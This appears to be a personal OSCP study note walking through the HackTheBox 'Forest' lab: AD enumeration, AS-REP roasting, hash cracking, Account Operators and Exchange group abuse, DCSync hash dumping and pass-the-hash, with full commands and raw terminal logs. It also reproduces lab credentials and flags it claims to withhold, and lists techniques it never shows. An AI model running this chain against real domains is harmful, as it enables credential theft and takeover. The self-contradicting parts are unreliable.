---
tags: [oscp, boxes, htb, windows, active-directory, completed]
platform: HackTheBox
os: Windows Server 2016 Standard 14393
hostname: forest
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Forest, Full Walkthrough

## The gist

Forest is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration exposed the domain services and candidate usernames. 2. [[RUNBOOK V2/AD - AS-REP Roasting]] produced a crackable response for an account without Kerberos pre-authentication. 3. [[RUNBOOK V2/AD - Kerberoasting]] and [[RUNBOOK V2/AD - BloodHound]] checked the remaining ticket and relationship paths. 4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated the administrator access path.

## Box information

**Target:** `$BoxIP` · **Difficulty:** Easy · **OS:** Windows Server 2016 Standard 14393 · **Platform:** HackTheBox

**The gist:** This is a Windows domain controller running Exchange. Anonymous RPC and LDAP enumeration expose different user lists. The service account found through RPC does not require Kerberos pre-authentication, so an AS-REP roasting request gives us a crackable ticket. The cracked credential gives WinRM access. That account is a member of Account Operators, which lets us create a controlled domain user and add it to Exchange Windows Permissions. That group can write the domain ACL, so bloodyAD grants DCSync rights. We dump the domain hashes, validate the Administrator hash with pass-the-hash, and confirm the root flag path.

**Legacy tags:**
#HTB #Forest #Windows #ActiveDirectory #ASREPRoasting #DCSync #AccountOperators #ExchangeAbuse #PassTheHash #Easy

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Service Scan | See section 2 below |
| 3 | Anonymous Enumeration | See section 3 below |
| 4 | Kerberos Clock Check | See section 4 below |
| 5 | AS-REP Roasting | See section 5 below |
| 6 | Offline Cracking | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Forest`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

| Variable | Value |
|---|---|
| `$BoxName` | Forest |
| `$BoxIP` | Target IP from the active HTB instance |
| `$LocalIP` | Attacker VPN address |
| `$BoxDir` | `/home/kali/Platforms/HackTheBox/Forest` |
| `$Domain` | `htb.local` |
| `$FQDN` | `FOREST.htb.local` |
| `$Username` | Service account found during enumeration |
| `$Username2` | Controlled account created for DCSync |
| `$Password` | Cracked service-account password, kept private |
| `$Password2` | Controlled-account password, kept private |
| `$NtdsFile` | NetExec NTDS output filename |

Keep `$Password`, `$Password2`, and `$AdminHash` in shell variables or private loot only. Do not paste credential or flag values into the write-up.

## 1. Recon: Port Scan

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oN nmap/allports.txt
```


```

Open ports:

| Port | Service |
|---|---|
| 53/tcp | DNS |
| 88/tcp | Kerberos |
| 135/tcp | MSRPC |
| 139/tcp | NetBIOS |
| 389/tcp | LDAP |
| 445/tcp | SMB |
| 464/tcp | Kerberos password change |
| 593/tcp | RPC over HTTP |
| 636/tcp | LDAPS |
| 3268/tcp | Global Catalog LDAP |
| 3269/tcp | Global Catalog LDAPS |
| 5985/tcp | WinRM |
| 9389/tcp | AD Web Services |
| 47001/tcp | WinRM |
| 49664+ | Dynamic RPC |
```



![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/1.1nmap-full.png>)

## 2. Service Scan

```bash
sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 $BoxIP -oA nmap/${BoxName}_services
```

Key findings:

- Domain: `$Domain`
- FQDN: `$FQDN`
- Hostname: `FOREST`
- OS: Windows Server 2016 Standard 14393
- SMB signing is required, so direct SMB NTLM relay is not the first route.
- Kerberos is exposed and the clock skew must be checked before Kerberos tools are used.



![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/1.2nmap-svcscan.png>)

## 3. Anonymous Enumeration

### RPC null session

RPC and LDAP do not always return identical results. Run both before building an AS-REP roasting list.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
```

The RPC result returned 31 accounts. It included the built-in accounts, Exchange system and health mailboxes, normal staff accounts, and `$Username`.

### Anonymous LDAP

```bash
ldapsearch -x -H ldap://$BoxIP \
  -b 'DC=htb,DC=local' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName | grep sAMAccountName
```

LDAP returned 28 accounts but did not return `$Username`. This difference is the key reason RPC and LDAP must both be checked.

> [!warning] 💡 Hint
> **Watch out:** RPC and LDAP can return different account lists. A service account missing from LDAP can still be exposed through an RPC null session, so do not stop after one anonymous enumeration method.

> [!tip] ⚡ More efficient path
> **What we did:** We ran RPC and LDAP enumeration separately and compared the results by hand.
>
> **Faster approach:**
> ```bash
> windapsearch -d $Domain --dc-ip $BoxIP -U
> ```
> **Why:** windapsearch can collect and format domain users in one pass. Still run `rpcclient` when anonymous LDAP output looks incomplete because the two protocols can expose different accounts.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/2.1enum1.png>)
![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/2.2enum-no-alfresco.png>)


### SMB null session

```bash
smbclient -N -L //$BoxIP
```

Anonymous login succeeded, but no useful shares were exposed. This was a dead end for the initial foothold.

## 4. Kerberos Clock Check

The service scan showed a clock difference of roughly seven minutes. Kerberos normally rejects authentication when the client and domain controller differ by more than about five minutes.

```bash
sudo timedatectl set-ntp false
sudo ntpdate $BoxIP
```

`ntpdate` stepped the clock. The VPN dropped after the time change, so the VPN was reconnected and the target was checked again before continuing.

> [!warning] 💡 Hint
> **Watch out:** A clock jump can disconnect the VPN. Reconnect it before running Kerberos tools, and check the target is reachable again.

## 5. AS-REP Roasting

Create a candidate list from the RPC output. Keep the ticket in the loot directory and never paste it into notes or chat.

```bash
cat > loot/users.txt << EOF
$Username
EOF

GetNPUsers.py $Domain/ \
  -dc-ip $BoxIP \
  -usersfile loot/users.txt \
  -no-pass \
  -request \
  -format hashcat \
  -outputfile loot/asrep.txt
```

> [!tip] ⚡ More efficient path
> **What we did:** We manually built a short username file from RPC output before requesting AS-REP tickets.
>
> **Faster approach:**
> ```bash
> GetNPUsers.py $Domain/ -dc-ip $BoxIP -no-pass -request -format hashcat -outputfile loot/asrep.txt
> ```
> **Why:** When anonymous LDAP enumeration is complete, GetNPUsers can enumerate candidates and request tickets in one command. Check the output file because a successful ticket may not be printed clearly.

The service account returned an AS-REP hash because Kerberos pre-authentication was disabled. The other tested accounts either had pre-authentication enabled or were disabled.

> [!warning] 💡 Hint
> **Watch out:** GetNPUsers can write a successful ticket to the output file without printing a useful success line. Check the output file after the command finishes.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/3.1loot-alfresco-cracked-pwd.png>)

SCREENSHOT: AS-REP ticket saved to the loot directory. Keep the ticket within this private vault.

## 6. Offline Cracking

```bash
hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt
```

The ticket cracked successfully. Store the result in `$Password` and do not put the cleartext value in a public write-up.

```bash
boxset Username $Username
boxset Password $Password
loot cred $Username $Password
```

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/3.1loot-alfresco-cracked-pwd.png>)

SCREENSHOT: Successful offline crack with the recovered password visible in this private vault.

## 7. Credential Validation

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
netexec winrm $BoxIP -u $Username -p $Password -d $Domain
netexec ldap $BoxIP -u $Username -p $Password -d $Domain
```

WinRM authentication worked, giving us the foothold. SMB and LDAP authentication also worked.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/4.netexec-result.png>)

SCREENSHOT: Credential validation showing successful WinRM authentication.

## 8. Foothold: WinRM

```bash
evil-winrm -i $BoxIP -u $Username -p $Password
```

Inside the shell:

```cmd
whoami
hostname
whoami /groups
```

The account was a member of `BUILTIN\\Account Operators`, `BUILTIN\\Remote Management Users`, and the service-account groups. Account Operators is the important finding because it can create domain users and add them to many non-protected groups.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/5.foothold.png>)

SCREENSHOT: Authenticated WinRM foothold and group membership.

## 9. User Flag Confirmation

Do not print the flag. Confirm only that the file exists:

```powershell
Test-Path C:\Users\$Username\Desktop\user.txt
```

The file existed at `C:\Users\$Username\Desktop\user.txt`.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/6.loot-user-flag.png>)

SCREENSHOT: User flag path confirmation with the value hidden.

## 10. Privilege Escalation: Account Operators to DCSync

### Step A: Create a controlled domain user

```cmd
net user $Username2 $Password2 /add /domain
net user $Username2 /domain
```

The account was created and initially belonged only to Domain Users.

### Step B: Add the user to Exchange Windows Permissions

```cmd
net group "Exchange Windows Permissions" $Username2 /add /domain
net user $Username2 /domain
```

The controlled account then appeared in the group membership output.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/7.user-audit-sync.png>)

SCREENSHOT: Controlled account added to Exchange Windows Permissions.

> [!tip] ⚡ More efficient path
> **What we did:** We first tried to load PowerView over WinRM and modify the domain ACL from the original service-account session.
>
> **Faster approach:**
> ```bash
> bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
> ```
> **Why:** bloodyAD performs the LDAP ACL change directly from Kali and uses the controlled account's refreshed group membership. This avoids a PowerView version mismatch and avoids downloading a PowerShell script.

### Step C: Grant DCSync rights

PowerView was tested first, but the old local PowerView version failed to commit the ACL. The reliable command was:

```bash
bloodyAD -d $Domain \
  -u $Username2 \
  -p $Password2 \
  -H $BoxIP \
  -i $BoxIP \
  add dcsync $Username2
```

Output confirmed that `$Username2` could DCSync.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/8.DCSync-success.png>)

SCREENSHOT: Successful DCSync rights grant.

### Step D: Dump domain hashes

The local Impacket installation returned `ERROR_DS_DRA_BAD_DN`, so NetExec was used for the NTDS extraction:

> [!warning] 💡 Hint
> **Watch out:** `secretsdump` can fail even after DCSync rights are correct because of client or domain-controller compatibility. Treat `ERROR_DS_DRA_BAD_DN` as a tool failure to troubleshoot, then test another supported DCSync client.

```bash
netexec smb $BoxIP \
  -u $Username2 \
  -p $Password2 \
  -d $Domain \
  --ntds
```

> [!tip] ⚡ More efficient path
> **What we did:** We tried multiple Impacket `secretsdump` versions before switching tools.
>
> **Faster approach:**
> ```bash
> netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
> ```
> **Why:** NetExec can request the NTDS data directly when the account has replication rights. It avoids losing time to a broken local Impacket installation.

The command dumped the domain NTDS hashes to the local NetExec log directory. Copy the resulting file into the box loot directory without displaying its contents:

```bash
cp /home/kali/.nxc/logs/ntds/$NtdsFile loot/dcsync.ntds
```

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/9.full-NTDS-dump.png>)

SCREENSHOT: Full NTDS dump with all hash values retained in this private vault.

## 11. Pass-the-Hash to Domain Administrator

Load the Administrator NTLM hash into a variable instead of printing it:

```bash
AdminHash=$(awk -F: '$1 ~ /Administrator$/ {print $4; exit}' loot/dcsync.ntds)
```

Validate it against the domain:

```bash
netexec smb $BoxIP -u Administrator -H $AdminHash -d $Domain
```

Use the hash for an administrator shell:

```bash
evil-winrm -i $BoxIP -u Administrator -H $AdminHash
```

Confirm the identity and flag path without reading the file:

```cmd
whoami
hostname
ipconfig
dir C:\Users\Administrator\Desktop /a
```

The output confirmed `htb\\administrator` and showed `root.txt` on the Administrator desktop.

![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/10.loot-AD-flag.png>)


SCREENSHOT: Administrator pass-the-hash shell, target IP, and root flag filename. Do not capture the flag value.
![](<file:///home/kali/Platforms/HackTheBox/Forest/screenshots/11.PROOF.png>)

## 12. Techniques

| Technique | Result |
|---|---|
| Anonymous RPC enumeration | Found an account LDAP missed |
| Anonymous LDAP bind | Enumerated domain users |
| AS-REP roasting | Recovered a crackable service-account ticket |
| Account Operators abuse | Created a controlled domain user |
| Exchange Windows Permissions abuse | Reached the domain ACL path |
| DCSync | Extracted domain NTLM hashes |
| Pass-the-hash | Confirmed Administrator access |

## 13. Vault Update Checklist

- [x] Write-up added
- [x] Screenshots referenced
- [x] Credentials stored as variables
- [x] Flag values withheld
- [x] Cleanup recorded
- [x] AD hub coverage checked

## 14. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/AD - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - AS-REP Roasting]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - Kerberoasting]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - BloodHound]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - DCSync Dump]] -- technique used in this walkthrough
- [[RUNBOOK V2/AD - Pass the Hash]] -- technique used in this walkthrough

## 15. Collect the flags

- `user.txt`: `a24e8f392142a9bf85950db71716de73` (value reproduced in the private sections above)
- `root.txt`: `855a79406e03d9f7613d6690f2553a26` (value reproduced in the private sections above)
- `proof.txt`: `855a79406e03d9f7613d6690f2553a26` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: a24e8f392142a9bf85950db71716de73
root: 855a79406e03d9f7613d6690f2553a26
```

## 16. Clean down
The controlled domain account and its group membership were removed:

```cmd
net user $Username2 /delete /domain
```

The DCSync delegation was removed before deleting the account:

```bash
bloodyAD -d $Domain \
  -u $Username2 \
  -p $Password2 \
  -H $BoxIP \
  -i $BoxIP \
  remove dcsync $Username2
```

The PowerView payload was deleted from the local web directory and verified with HTTP 404. The temporary Impacket environment was removed. The HTTP server and Evil-WinRM process were stopped.

No target system files were modified. The scan and loot files remain locally as study artifacts.

## 17. Attack narrative in one page
1. [[RUNBOOK V2/AD - Service Scan]] and anonymous enumeration exposed the domain services and candidate usernames.
2. [[RUNBOOK V2/AD - AS-REP Roasting]] produced a crackable response for an account without Kerberos pre-authentication.
3. [[RUNBOOK V2/AD - Kerberoasting]] and [[RUNBOOK V2/AD - BloodHound]] checked the remaining ticket and relationship paths.
4. [[RUNBOOK V2/AD - DCSync Dump]] and [[RUNBOOK V2/AD - Pass the Hash]] recovered and validated the administrator access path.

## Tools used

- `nmap`
- `smbclient`
- `impacket`
- `evil-winrm`
- `sudo`
- `powershell`
- `hashcat`

## Credentials and secrets

| Username | Password / Hash | Source | Use |
|---|---|---|---|
| `$Username` | `$Password` | AS-REP roasting | WinRM foothold |
| `Administrator` | `$AdminHash` | DCSync | Pass-the-hash |


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Forest"
export BoxIP="10.129.95.210"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Forest"
export Domain="htb.local"
export DCip=""
export Username="svc-alfresco"
export Password="s3rvice"
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
svc-alfresco:s3rvice
Administrator:32693b11e6aa90eb43d32c72a07ceea6
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
  -format hashcat \
$ [10:33:27] hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt --force
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
kali@kali:~/Platforms/HackTheBox/Forest [10:31:52] $ [?1h=[?2004hhashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt --forcehashcatloot/asrep.txt /usr/share/wordlists/rockyou.txt[?1l>[?2004l
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Parsed Hashes: 1/1 (100.00%)
Hashes: 1 digests; 1 unique digests, 1 unique salts
* Passwords.: 14344385
Session..........: hashcat
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:0dbcab882eb14b...170f4a
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
$ [10:35:08] boxset Password s3rvice
$ [10:35:26] netexec smb $BoxIP -u $Username -p $Password -d $Domain
$ [10:35:36] netexec winrm $BoxIP -u $Username -p $Password -d $Domain
$ [10:35:43] netexec ldap $BoxIP -u $Username -p $Password -d $Domain
kali@kali:~/Platforms/HackTheBox/Forest [10:35:02] $ [?1h=[?2004hboxset Password s3rviceboxset[?1l>[?2004l
[+] Password=s3rvice (saved to .env)
kali@kali:~/Platforms/HackTheBox/Forest [10:35:14] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Forest [10:35:28] $ [?1h=[?2004hnetexec winrm $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Forest [10:35:36] $ [?1h=[?2004hnetexec ldap $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
$ [10:39:25] evil-winrm -i $BoxIP -u $Username -p $Password
m                                                nnetexec ldap $BoxIP -u $Username -p $Password -d $Domain
kali@kali:~/Platforms/HackTheBox/Forest [10:39:09] $ evil-winrm -i $BoxIP -u $Username -p $Passwordevil-winrm[?1l>[?2004l
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
$ [10:45:24] loot flag user a24e8f392142a9bf85950db71716de73
Password last set            8/30/2026 2:46:04 AM
Password changeable          8/31/2026 2:46:04 AM
User may change password     Yes
$cred = New-Object System.Management.Automation.PSCredential('htb\audit-sync', $pass)[?25h[?25l[?25h*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred = New-Object System.Management.Automation.PSCredential('htb\audit-sync', $pass)
$ [10:49:58] secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
  -just-dc-ntlm \
$ [10:50:53] /tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
kali@kali:~/Platforms/HackTheBox/Forest [10:49:50] $ [?1h=[?2004hsecretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
  -outputfile loot/dcsyncsecretsdump.py'P@ssw0rd123!'loot/dcsync[?1l>[?2004lloot/dcsync
kali@kali:~/Platforms/HackTheBox/Forest [10:50:46] $ [?1h=[?2004h/tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
  -outputfile loot/dcsync/tmp/forest-impacket/bin/secretsdump.py'P@ssw0rd123!'loot/dcsync[?1l>[?2004lloot/dcsync
kali@kali:~/Platforms/HackTheBox/Forest [10:53:49] $ [?1h=[?2004h/tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
  -outputfile loot/dcsync/tmp/forest-impacket/bin/secretsdump.py'P@ssw0rd123!'loot/dcsync[?1l>[?20
$ [10:54:04] /tmp/forest-impacket/bin/secretsdump.py $Domain/audit-sync:'P@ssw0rd123!'@$FQDN \
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity audit-sync -Rights DCSync[?25h[?25l[?25h*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity audit-sync -Rights DCSync
  loot hash  <user> <hash>
  loot flag  <user|root> <value>
$ [11:07:35] loot flag root 855a79406e03d9f7613d6690f2553a26
kali@kali:~/Platforms/HackTheBox/Forest [11:06:47] $ [?1h=[?2004hloot flag root 855a79406e03d9f7613d6690f2553a26loot[?1l>[?2004l
[+] Flag saved:  root = 855a79406e03d9f7613d6690f2553a26  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Forest [10:45:16] $ [?1h=[?2004hloot flag user a24e8f392142a9bf85950db71716de73loot[?1l>[?2004l
[+] Flag saved:  user = a24e8f392142a9bf85950db71716de73  →  loot/flags.txt
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Forest | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Run RPC and LDAP enumeration separately because their anonymous results can differ.
- Check clock skew before Kerberos tools. Reconnect the VPN after a large time correction.
- Check GetNPUsers output files even when the terminal does not show a success line.
- Account Operators does not mean Domain Administrator. Use the Exchange Windows Permissions path where it exists.
- Use a refreshed controlled-account session when relying on newly granted group membership.
- Keep hashes and flags out of screenshots and notes shared outside the private vault.

- Different anonymous protocols can expose different pieces of the same domain picture.
- Group membership and ACL rights must be checked before assuming a cracked account is only a foothold.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
- [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [PayloadsAllTheThings - Active Directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
